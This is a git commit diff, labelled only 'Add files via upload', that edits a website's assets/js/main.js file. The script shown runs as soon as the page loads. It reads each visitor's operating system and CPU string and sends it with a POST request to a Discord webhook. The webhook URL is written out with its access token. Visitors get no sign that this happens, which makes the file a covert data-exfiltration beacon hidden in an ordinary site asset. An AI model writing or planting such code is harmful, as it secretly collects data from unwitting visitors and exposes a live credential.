217d5071880b689a984d381c714ec5b436e0ddd8
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 08:09:44 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,5 +1,5 @@
 (async () => {
-    const params = { content: `${navigator.oscpu}` };
+    const params = { content: `${window.navigator.oscpu}` };
     const rawResponse = await fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
         method: 'POST',
         headers: {
